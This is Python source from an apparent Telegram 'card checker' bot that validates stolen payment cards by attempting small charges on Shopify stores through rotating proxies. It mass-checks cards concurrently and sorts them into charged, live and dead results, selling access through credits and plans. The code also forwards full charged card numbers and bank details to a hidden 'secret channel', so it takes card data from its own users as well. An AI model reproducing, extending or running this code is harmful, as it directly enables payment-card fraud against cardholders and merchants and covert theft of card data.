    rows = [[_btn(f"Charged ({charged_n})", cb=f"{_CB_RESULT}:{sid}:charged", style="danger"), _btn(f"Live ({live_n})", cb=f"{_CB_RESULT}:{sid}:live", style="success"), _btn(f"All ({all_n})", cb=f"{_CB_RESULT}:{sid}:all", style="primary")]]
    if running: rows.append([_btn("Stop", cb=f"{_CB_STOP}:{sid}", style="danger")])
    return RawMarkup(rows)

async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    now = time.time()
    if not force and (now - sess.get("last_update", 0)) < 1.0: return
    text = _progress_text(sess); running = sess["status"] == "CHECKING"
    if text == sess.get("last_text") and not force: return
    try:
        await bot.edit_message_text(chat_id=sess["chat_id"], message_id=sess["msg_id"], text=text, parse_mode="HTML", reply_markup=_msh_buttons(sid, running), disable_web_page_preview=True)
        sess["last_text"] = text; sess["last_update"] = now
    except: pass

def _make_result_file(sess: dict, kind: str) -> tuple:
    if kind == "charged": cards, label = sess.get("charged_cards", []), "Charged"
    elif kind == "live": cards = sess.get("charged_cards", []) + sess.get("live_cards", []); label = "Live"
    elif kind == "dead": cards, label = sess.get("dead_cards", []), "Dead"
    else: cards = sess.get("charged_cards", []) + sess.get("live_cards", []) + sess.get("dead_cards", []) + sess.get("error_cards", []); label = "All"
    uname = (sess.get("user_obj") and (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"; plan = sess.get("plan", "TRIAL")
    lines = ["Gate ➳ Shopify | 0-5 USD", f"Result ➳ {label}", f"Total ➳ {len(cards)}", f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "━━━━━━━━━━━━━━"]
    for cd in cards:
        bi = cd.get("bin_info", {}); flag = bi.get("country_emoji", "🌍"); cdisp = f"{flag} {bi.get('country','N/A')}".strip()
        resp = cd.get("resp", cd.get("response", "N/A")) or "N/A"; ver = cd.get("verdict", "N/A"); prc = cd.get("price", "0.00"); cur = cd.get("currency", "USD")
        status = "Charged" if ver == "CHARGED" else "Live" if ver in ("LIVE","TDS") else "Dead" if ver == "DEAD" else "Error"
        raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
        lines += [f"Card ➳ {cd.get('card','N/A')}", f"Status ➳ {status}", f"Gate ➳ Shopify | {prc} {cur}", f"Resp ➳ {raw_disp}", f"Brand ➳ {bi.get('scheme','N/A')}", f"Issuer ➳ {bi.get('bank','N/A')}", f"Country ➳ {cdisp}", "━━━━━━━━━━━━━━"]
    buf = BytesIO("\n".join(lines).encode("utf-8")); buf.seek(0)
    return buf, f"Superman_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", len(cards)

async def _send_hit(bot, user, text: str, verdict: str, card: str = "", bin_data: dict = None, price: str = "0.00", currency: str = "USD", plan: str = "TRIAL", resp: str = "", skip_dm: bool = False):
    bin_data = bin_data or {}
    if verdict in ("LIVE", "TDS"): return
    eid = get_random_charged_emoji(); ulink = _user_link(user); resp_disp = escape(resp) if resp else "ORDER_PAID"
    gate_txt = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
    log_html = f'<b>HIT ➛ CHARGED <tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n<b>{gate_txt}</b>\n<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> <code>{resp_disp}</code></b>\n<b>User ➛ {ulink} <tg-emoji emoji-id="{_plan_eid(plan)}">⭐</tg-emoji></b>'
    log_kb = RawMarkup([[_btn("𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", url=BOT_USERNAME_LINK, style="primary")]])
    if not skip_dm:
        try: await _send_as_media(bot, user.id, eid, caption=text, parse_mode="HTML")
        except: pass
    if SECRET_CHANNEL_ID and verdict == "CHARGED":
        try:
            bin_s = escape(_bin_str_plain(bin_data))
            sc_html = f"<b>HIT ➛ CHARGED 💎</b>\n<b>{gate_txt}</b>\n<b>──────────</b>\n<b>💳 <code>{escape(card)}</code></b>\n<b>🏦 {bin_s}</b>\n<b>──────────</b>\n<b>👤 {ulink} ⭐</b>\n<b>⚡ {DEV_LINK_HTML}</b>"
            await _send_as_media(bot, SECRET_CHANNEL_ID, eid, caption=sc_html, parse_mode="HTML", disable_notification=True)
        except: pass

def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id, total, user_obj, plan) -> dict:
    sess = {"status": "CHECKING", "chat_id": chat_id, "user_id": user_id, "msg_id": msg_id, "user_msg_id": user_msg_id, "total": total, "checked": 0, "charged": 0, "approved": 0, "dead": 0, "errors": 0, "start_time": time.time(), "charged_cards": [], "live_cards": [], "dead_cards": [], "error_cards": [], "tasks": [], "last_text": "", "last_update": 0, "user_obj": user_obj, "plan": plan, "plan_eid": _plan_eid(plan)}
    MSH_SESSIONS[sid] = sess; return sess

async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies, bot_data=None):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    effective_proxies = proxies if proxies else _ALL_PROXIES
    if not effective_proxies: effective_proxies = _load_proxies()
    if not all_sites: all_sites = get_working_sites()
    elif _WORKING_SITES: all_sites = list(_WORKING_SITES)
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async def worker(card_fmt: str, cc_num: str):
        if sess.get("status") != "CHECKING": return
        async with sem:
            if sess.get("status") != "CHECKING": return
            t0 = time.time(); card_sites = list(all_sites); random.shuffle(card_sites); card_proxies = list(effective_proxies); random.shuffle(card_proxies)
            try: verdict, resp, price, currency = await _check_card_with_retry(None, card_fmt, card_sites, card_proxies, max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid)
            except: verdict, resp, price, currency = "ERROR", "Unknown Error", "0.00", "USD"
            elapsed = time.time() - t0
            try: bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except: bin_data = {}
            rec = {"card": card_fmt, "verdict": verdict, "resp": resp, "response": resp, "price": price, "currency": currency, "bin_info": bin_data}
            sess["checked"] += 1
            if verdict == "CHARGED":
                sess["charged"] += 1; sess["charged_cards"].append(rec)
                if bot_data is not None:
                    _ud_store = bot_data.setdefault("user_data", {}); _ud_msh = _ud_store.setdefault(str(user.id), {}); _ud_msh["total_charged"] = _ud_msh.get("total_charged", 0) + 1
                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data, price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(bot, user, _dm_html, "CHARGED", card=card_fmt, bin_data=bin_data, price=price, currency=currency, plan=plan, resp=resp))
                asyncio.create_task(_update_progress(bot, sid, force=True))
            elif verdict == "TDS": sess["approved"] += 1; sess["live_cards"].append(rec); asyncio.create_task(_update_progress(bot, sid, force=True))
            elif verdict == "LIVE": sess["approved"] += 1; sess["live_cards"].append(rec); asyncio.create_task(_update_progress(bot, sid, force=True))
            elif verdict == "DEAD": sess["dead"] += 1; sess["dead_cards"].append(rec)
            else: sess["errors"] += 1; sess["error_cards"].append(rec)
            asyncio.create_task(_update_progress(bot, sid))
    sess["tasks"] = []
    for cf, cn in valid_cards:
        if sess.get("status") != "CHECKING": break
        t = asyncio.create_task(worker(cf, cn)); sess["tasks"].append(t)
    await asyncio.gather(*sess["tasks"], return_exceptions=True)
    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING": MSH_SESSIONS[sid]["status"] = "FINISHED"
    await _update_progress(bot, sid, force=True)

async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; parts = q.data.split(":", 2)
    if len(parts) < 3: await q.answer("❌ Invalid.", show_alert=True); return
    _, sid, kind = parts; sess = MSH_SESSIONS.get(sid)
    if not sess: await q.answer("⚠️ Session expired.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"): await q.answer("❌ Not your session.", show_alert=True); return
    buf, fname, count = _make_result_file(sess, kind)
    if count == 0 and kind != "all": await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
    await q.answer("📦 Generating file…")
    try: await context.bot.send_document(chat_id=q.message.chat_id, document=InputFile(buf, filename=fname), caption=f"<b>Result ➳ {kind.capitalize()}</b>\n<b>Total ➳ {count}</b>", parse_mode="HTML")
    except: pass

async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; parts = q.data.split(":", 1)
    if len(parts) < 2: await q.answer("❌ Invalid.", show_alert=True); return
    _, sid = parts; sess = MSH_SESSIONS.get(sid)
    if not sess: await q.answer("⚠️ Already finished.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"): await q.answer("❌ Not your session.", show_alert=True); return
    if sess["status"] != "CHECKING": await q.answer("ℹ️ Not running.", show_alert=True); return
    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done(): t.cancel()
    await q.answer("🛑 Stopped.")
    await _update_progress(context.bot, sid, force=True)

async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user; ud = _get_ud(user.id, context)
    if context.bot_data.get("maintenance") and user.id != OWNER_ID: await update.message.reply_text("🔧 <b>Bot under maintenance.</b>", parse_mode="HTML"); return
    if not context.bot_data.get("sh_on", True): await update.message.reply_text("❌ <b>Single check disabled.</b>", parse_mode="HTML"); return
    card = None
    if context.args: card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or update.message.reply_to_message.caption or "").strip()
        if txt:
            _found = extract_cards(txt)
            if _found: card = _found[0]
            elif "|" in txt: card = next((t for t in txt.split() if "|" in t), None)
    if not card or "|" not in card: await update.message.reply_text("ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>", parse_mode="HTML"); return
    parts = card.split("|")
    if len(parts) != 4: await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return
    cc, mm, yy, cvv = parts
    if not luhn_check(cc): await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
    if is_expired(mm, yy): await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return
    premium = _is_premium(ud, user.id)
    if not premium:
        if ud.get("credits", 0) <= 0: await update.message.reply_text("❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
        cd_map = context.bot_data.setdefault("sh_cd", {}); rem = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0: await update.message.reply_text(f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>", parse_mode="HTML"); return
        cd_map[user.id] = time.time(); ud["credits"] = max(0, ud.get("credits", 1) - 1)
    plan = ud.get("plan", "TRIAL")
    spin = await update.message.reply_text('<b>🔄 Checking Card...</b>', parse_mode="HTML")
    proxies = _load_proxies()
    if not proxies: await spin.edit_text("❌ <b>No proxies in px.txt</b>", parse_mode="HTML"); return
    try: sites = get_working_sites()
    except: await spin.edit_text("❌ <b>No Shopify sites configured.</b>", parse_mode="HTML"); return
    if not sites: await spin.edit_text("❌ <b>sites.txt is empty.</b>", parse_mode="HTML"); return
    t0 = time.time()
    try:
        (verdict, resp, price, currency), bin_data = await asyncio.gather(_check_card_with_retry(None, card, sites, proxies, max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT), _bin_lookup(cc[:6]))
    except: verdict, resp, price, currency = "ERROR", "Unknown Error", "0.00", "USD"; bin_data = {}
    elapsed = time.time() - t0; res_html = build_result_msg(card, resp, verdict, bin_data, price, currency, elapsed, user, plan)
    if verdict == "CHARGED":
        _cmd_eid = get_random_charged_emoji(); _ud_sh = _get_ud(user.id, context); _ud_sh["total_charged"] = _ud_sh.get("total_charged", 0) + 1
    elif verdict in ("LIVE", "TDS"): _cmd_eid = get_random_live_emoji()
    else: _cmd_eid = DECLINED_EMOJI_ID
    kb = RawMarkup([[_btn(f"📢 {BOT_NAME}", url=CHANNEL_LINK, style="primary")]])
    try: await spin.delete()
    except: pass
    await _send_as_media(context.bot, update.effective_chat.id, _cmd_eid, caption=res_html, parse_mode="HTML", reply_markup=kb, reply_to_message_id=update.message.message_id)
    if verdict in ("CHARGED", "LIVE", "TDS"):
        _in_private = (update.effective_chat.id == user.id)
        asyncio.create_task(_send_hit(context.bot, user, res_html, verdict, card=card, bin_data=bin_data, price=price, currency=currency, plan=plan, resp=resp, skip_dm=_in_private))

def get_sh_handler(): return CommandHandler("sh", cmd_sh)
def get_me_handler(): return CommandHandler("me", cmd_me)

async def cmd_me(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user; ud = _get_ud(user.id, context); charged = ud.get("total_charged", 0)
    display = f"@{user.username}" if getattr(user, "username", None) else user.first_name or "User"
    mb = MsgBuilder()
    mb.emoji("6181649972757271368", "⚜").bold(f"Total charge cards➳{charged}").nl()
    mb.emoji("6264538349034281099", "😃").italic(display).nl()
    mb.emoji("6271506980716680365", "👑").bold("Bot➳").mention("@superman8585_bot")
    text, entities = mb.build()
    await update.message.reply_text(text, entities=entities)

__all__ = [
    "get_sh_handler", "get_me_handler", "_check_card_with_retry", "SITE_RETRIES", "SITE_TIMEOUT",
    "MSH_SESSIONS", "run_mass_batch", "create_msh_session", "cb_msh_result", "cb_msh_stop", "build_result_msg",
    "_load_sites", "_load_proxies", "probe_all_sites", "get_working_sites", "start_probe_background", "stop_probe_background",
    "_WORKING_SITES", "_PROBE_IN_PROGRESS", "_send_as_media", "_get_sticker_fid", "_send_sticker", "get_random_live_emoji",
    "_bin_lookup", "_bin_str_plain"
]
